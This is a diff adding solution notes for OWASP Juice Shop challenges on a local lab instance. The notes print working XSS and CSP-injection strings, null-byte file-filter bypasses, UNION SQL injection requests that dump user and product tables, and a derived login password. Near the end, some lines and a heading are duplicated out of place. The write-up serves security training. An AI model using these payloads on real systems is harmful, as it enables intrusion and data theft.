@@ -318,4 +318,240 @@ Challenge: CSP Bypass
 	a. Console raises Error: Content Security Policy: The page’s settings blocked the loading of a resource at inline (“script-src”).
 5. Resources that may be useful:
 	a. https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/
-	b. https://www.youtube.com/watch?v=J90t0h0AP1U 
+	b. https://www.youtube.com/watch?v=J90t0h0AP1U
+6. Following guide in OWASP Juice Shop solutions, we can see that we are able to add invalid urls to CSP
+	a. https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' 
+	b. This allows us to amend the CSP itself.
+7. After amending the CSP, we can type in "<<a|ascript>alert(`xss`)</script>" to "Set Username" field to execute XSS
+8. Challenge Completed.
+
+Challenge: Easter Egg
+Hint: If you solved one of the three file access challenges, you already fknow where to find the easter egg.
+1. Navigate to http://localhost:3000/ftp and we see there is a file called eastere.gg
+	a. Let's download it --> Error: Only .md and .pdf files are allowed
+	b. We can bypass this by adding null byte: %2500 to the back of the file
+	c. http://localhost:3000/ftp/eastere.gg%2500.md
+2. Challenge Solved.
+3. Looking inside the file, we see a base64 string, decoding it gives:
+	a. /gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
+	b. Might be useful in the future.
+
+Challenge: Ephemeral Accountant
+1. We know the backend is using sqlite db; we are interested with `Users` table. 
+
+"CREATE TABLE `Users` (
+`id` INTEGER PRIMARY KEY AUTOINCREMENT, 
+`username` VARCHAR(255) DEFAULT '', 
+`email` VARCHAR(255) UNIQUE, 
+`password` VARCHAR(255), 
+`role` VARCHAR(255) DEFAULT 'customer', 
+`deluxeToken` VARCHAR(255) DEFAULT '', 
+`lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', 
+`profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', 
+`totpSecret` VARCHAR(255) DEFAULT '', 
+`isActive` TINYINT(1) DEFAULT 1, 
+`createdAt` DATETIME NOT NULL, 
+`updatedAt` DATETIME NOT NULL, 
+`deletedAt` DATETIME)"
+
+2. SQL Injection with UNION to fill in all fields of the above `Users` table to complete this challenge.
+-- SQL Injection Payload --
+' UNION SELECT * FROM (SELECT 1 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '123' as 'password', 'accounting' as 'role', '' as 'deluxeToken', '127.0.0.1' as 'lastLoginIp', 'default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
+
+	a. IDs up to 20 returns a succesful creation of the non-existant account.
+	b. IDs after 20 returns ERROR: SQLITE_CONSTRAINT: FOREIGN KEY constraint failed
+3. Challenge Completed.
+
+Challenge: Expired Coupon
+Hint: Try to identify past special event or holiday campaigns of the shop first.
+1. Looking at Juice Shop Home Page, we can identify a few special events:
+	a. Juice Shop "Permafrost" 2020 Edition
+	b. Juice Shop Adversary Trading Card (Common/Super Rare)
+	c. Melon Bike (Comeback-Product 2018 Edition)
+	d. OWASP Juice Shop "King of the Hill" Facemask	
+2. We have to log in to redeem the coupon. To redeem a coupon, we need to purchase any item --> /localhost:3000/#/payment/shop
+	a.  Coupon code must be 10 characters long. <-- after entering som random words into the Coupon field.
+3. Submitting Coupon Code:PermaFrost, we get [object Object] on the UI.
+	a. Further Investigation in burpsuite shows the object returned:
+{
+  "error": {
+    "message": "jwt expired",
+    "name": "UnauthorizedError",
+    "code": "invalid_token",
+    "status": 401,
+    "inner": {}
+  }
+}
+	b. After logout and login and trying to redeem the coupon code:PermaFrost, `Invalid coupon` is being returned --> wrong code...
+	c. Looking at the PUT Request, we can see that the coupon code is added to the path PUT /rest/basket/2/coupon/PermaFrost HTTP/1.1
+	d. I could brute force the code, but I'd try to see if there are any coupons leaked within the loaded js files --> debugger in DevTools.
+4. In main-es2018.js, we find an interesting object --> this.campaigns
+this.campaigns = {
+WMNSDY2019: {
+validOn: 1551999600000,
+discount: 75
+},
+WMNSDY2020: {
+validOn: 1583622000000,
+discount: 60
+},
+WMNSDY2021: {
+validOn: 1615158000000,
+discount: 60
+},
+WMNSDY2022: {
+validOn: 1646694000000,
+discount: 60
+},
+WMNSDY2023: {
+validOn: 1678230000000,
+discount: 60
+},
+ORANGE2020: {
+validOn: 1588546800000,
+discount: 50
+},
+ORANGE2021: {
+validOn: 1620082800000,
+discount: 40
+},
+ORANGE2022: {
+validOn: 1651618800000,
+discount: 40
+},
+ORANGE2023: {
+validOn: 1683154800000,
+discount: 40
+}
+}
+5. Each coupon code as a validOn field, seems to be on valid on that date/time.
+	a. For WMNSDY2019, converting epoch time 1551999600000 gives Thu Mar 07 2019 18:00:00 GMT-0500 (Eastern Standard Time).
+	b. Let's change our computer's time to match that.
+	c. I will change my host machines time to 07 Mar 2019 18:00:00 and the VM will sync to that. Submitting this code fails; looking at debugger, there seems to be a time offset.
+	d. Changing host time to 8 Mar 2019 18:00:00 solve this issue.
+6. Challenge Completed.
+
+Challenge: Forgetten Sales Backup
+1. Navigate to localhost:3000/ftp and download coupons_2013.md.bak
+	a. Use null byte attack to bypass filter --> coupons_2013.md.bak%00.md
+2.Challenge Completed.
+
+Challenge: GDPR Data Theft
+1. Navigate to localhost:3000/#/privacy-security/data-export and capture traffic with burpsuite in the background while exporting data in json
+	a. Request Data Export only available in JSON, not PDF or Excel.
+	b. Response :
+{"userData":"{\n  \"username\": \"\",\n  \"email\": \"jim@juice-sh.op\",\n  \"orders\": [],\n  \"reviews\": [\n    {\n      \"message\": \"Looks so much better on my uniform than the boring Starfleet symbol.\",\n      \"author\": \"jim@juice-sh.op\",\n      \"productId\": 20,\n      \"likesCount\": 0,\n      \"likedBy\": []\n    },\n    {\n      \"message\": \"Fresh out of a replicator.\",\n      \"author\": \"jim@juice-sh.op\",\n      \"productId\": 22,\n      \"likesCount\": 0,\n      \"likedBy\": []\n    },\n    {\n      \"message\": \"Looks spacy on Bones' new tricorder!\",\n      \"author\": \"jim@juice-sh.op\",\n      \"productId\": 37,\n      \"likesCount\": 0,\n      \"likedBy\": []\n    }\n  ],\n  \"memories\": []\n}","confirmation":"Your data export will open in a new Browser window."}
+	c. Request = {"format": 1}
+	d. No luck in adding more fields to Request JSON such as "email":"another user"
+	e. Probably not the way to complete this challenge
+2. After making a purchase on a random account and navigating to localhost:3000/rest/track-order/orderId
+	a. We can see that the response is as follows:
+{"status":"success","data":[{"promotionalAmount":0,"paymentId":"wallet","addressId":"4","orderId":"ad9b-fd8cde5b601484e7","delivered":false,"email":"j*m@j**c*-sh.*p","totalPrice":10.48,"products":[{"quantity":2,"id":4,"name":"Raspberry Juice (1000ml)","price":4.99,"total":9.98,"bonus":0}],"bonus":0,"deliveryPrice":0.5,"eta":"3","_id":"hPKX2AZQ6wrsx6mXD"}]}
+	b. email field has some letters replaced with the * character. 
+3. Create a new account with those letters replaced and see if we get the same behavior.
+	a. jbm@jadce-sh.lp 
+	b. pass:123123123
+	c. The success response message is as follows:
+{"status":"success","data":[{"promotionalAmount":0,"paymentId":"7","addressId":"7","orderId":"5a5f-b85f0acf93ad1b71","delivered":false,"email":"jbm@j*dc*-sh.lp","totalPrice":1.88,"products":[{"quantity":1,"id":24,"name":"Apple Pomace","price":0.89,"total":0.89,"bonus":0}],"bonus":0,"deliveryPrice":0.99,"eta":"1","_id":"vjpRAYnvDYEZKRhih"}]}
+	d. email field is jbm@j*dc*-sh.lp
+	e. looks like only vowels were replaced --> Let's create an email with a different vowels and those positions of jim's account.
+	f.  jam@juice-sh.op
+4. Navigating to Order History, we get a list of orders even though this is a fresh account. But this did not trigger the Notificaion that says Challenge Completed.
+5. Only after requesting Data Export, did the Notification pop up.
+6. Challenge Complete.
+
+Challenge: HTTP-Header XSS
+1. Need to find a web page that calls the http header; this allows the persisted XSS attack to be loaded --> Probably "Last Login IP"
+	a. There is no request made when navigating to http://localhost:3000/#/privacy-security/last-login-ip and we see this behavior with burpsuite while navigating the webpage. 
+	b. When logging out, we see a GET Request made to /rest/saveLoginIP
+	c. Adding HTTP Header of True-Client-IP:1.2.3.4 allowed us to see the last saved IP to be exactly that when we relogin into the same account and navigate to /privacy-security/last-login-ip
+2. Replace the value field of True-Client-IP with the payload and we are done.
+3. For reasons unknown to me, I was not able to repeat the GET request to /rest/saveLoginIP with the extra Header. I completed this challenge by editing the GET request using DevTools.
+3. Challenge Completed.
+
+
+Challenge: Leaked Unsafe Product
+1. We can look at the previous SQL Injection where we exfiltrated the schema. In it was a table named Products, which is interesting to us.	
+2. GET /rest/products/search?q=applke'))UNION%20SELECT%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20FROM%20Products-- HTTP/1.1 
+	a. This allows us to exfiltrate the Products table.
+	b. One Product's (Rippertuer Special Juice) description caught my attention --> This item has been made unavailable because of lack of safety standards.
+3. The full description is
+"Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br/><span style=\"color:red;\">This item has been made unavailable because of lack of safety standards.</span> (This product is unsafe! We plan to remove it from the stock!)"
+	a. Ingredients used : Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos
+	b. The listed Ingredients are not dangerous. Informing the site with those names will not complete the challenge.
+	c. Searching in Goolge with the keyword as Rippertuer Special Juicec leads us to a pastebin page https://pastebin.com/90dUgd7s. I saved the text into rippertuer-special-juice.txt
+	d. Ingreidents that are dangerous are : Eurogium Edule and Hueteroneel
+4. Challenge Completed.
+
+Challenge: Legacy Typosquatting
+1. Download package.json.bak%00.md using null byte injection.
+2. Look at the dependencies --> There is one typo: epilogue-js, it should be epilogue
+3. Submit this in feedback form to complete the challenge. 
+4. This takes time to check each dependency.
+5. Challenge Completed.
+
+Challenge: Login Bjoern
+1. Using the previous SQL Injection, we can query Users table with this GET Request:
+GET /rest/products/search?q=applke'))UNION%20SELECT%20oid,username,email,password,role,deluxeToken,lastLoginIp,8,9%20FROM%20Users-- HTTP/1.1
+2. We find Bjoern's details as such:
+{"id":4,"name":"bkimminich","description":"bjoern.kimminich@gmail.com","price":"6edd9d726cbdc873c539e41ae8757b8c","deluxePrice":"admin","image":"","createdAt":"0.0.0.0","updatedAt":8,"deletedAt":9}
+3. We can also find his email account with OSINT.
+4. Looking at main-es2018.js and searching OAUTH, this section of code is interesting:
+ngOnInit() {
+          this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe(t=>{
+            let e = btoa(t.email.split('').reverse().join(''));
+            this.userService.save({
+              email: t.email,
+              password: e,
+              passwordRepeat: e
+            }).subscribe(() =>{
+              this.login(t)
+            }, () =>this.login(t))
+          }, t=>{
+            this.invalidateSession(t),
+            this.ngZone.run(() =>this.router.navigate(['/login']))
+          })
+        }
+
+5. The above function first saves the users' email, password before proceeding to log in.
+6. btoa() encodes a string in b64; atob() decodes the b64 string.
+7. It looks like e is set as the  password; such a configuration is wrong. --> the password is hardcoded into main-es2018.js as the b64 encoded string of the reversed email account
+8. email: bjoern.kimminich@gmail.com | password: b64.encode(moc.liamg@hcinimmik.nreojb) --> bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
+9. Challenge Completed.
+
+Challenge:  Misplaced Signature File
+1. In http://localhost:3000/ftp, we see a file named suspicious_errors.yml and we know a yml file is part of sigma's schema. 
+2. Download that file using null byte injection --> suspicious_errors.yml%2500.pdf
+3. Challenge Completed
+ 
+Challenge: Nested Easter Egg
+1. Pre-requiste of solving Challenge "Find the hidden Easter egg", from which we downloaded a file: eastere.gg%2500.md with null byte injection attack.
+2. The interesting contents are:  
+
+Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:
+
+L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA== 
+3. The last portion looks like a b64 encoded string, decoding it gives
+/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
+4. This appended to localhost:3000/ will not work;
+5. We see recurring paths in the decoding string such as rtt and gur and searching online with rtt and gur encryption hints ROT13 was used.
+6. The online ROT13 decoder decoded the path as /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
+7. Appending it to  localhost:3000 and we are directed to a page of rotating planet.
+8. Challenge Solved. 
+
+Challenge: NoSQL DoS
+
+/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
+4. This appended to localhost:3000/ will not work;
+5. We see recurring paths in the decoding string such as rtt and gur and searching online with rtt and gur encryption hints ROT13 was used.
+6. The online ROT13 decoder decoded the path as /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
+7. Appending it to  localhost:3000 and we are directed to a page of rotating planet.
+8. Challenge Solved. 
+
+Challenge: NoSQL DoS
+1. MarsDB is used in Juice Shop --> Search for DoS for MarsDB
+2. There is an existing DoS vulnerability listed on https://snyk.io/test/npm/marsdb-mongo/0.0.7, but it does not explicitly tell us how to do it. 
+3. Also, we need to find the endpoint that connects to the DB. Now we know that there are 2 types of DB used in juice shop --> SQL and noSQL. 
+	a. There is not much details in burpsuite that points to an explicit marsdb endpoint (eg. no endpt like /rest/marsdb) 
+	b. Another way of handling db interfacing on server side is to encapsulate the connection uri in the server side function; making it hidden to clients.
+	c. So, the possible pages that will interface marsdb are anything that looks like it pulls data from a DB --> reviews, products,  etc.
